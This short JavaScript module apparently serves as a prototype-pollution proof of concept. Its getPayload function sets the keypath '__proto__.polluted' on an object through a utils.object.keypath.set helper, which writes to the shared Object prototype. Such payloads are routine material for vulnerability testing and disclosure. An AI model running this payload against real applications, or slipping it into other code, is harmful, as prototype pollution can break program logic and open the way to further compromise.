function getPayload() {
    return {
        setPrototypePollution: (obj) => {
            utils.object.keypath.set(obj, "__proto__.polluted", "yes");
        }
    };
}

module.exports = { getPayload };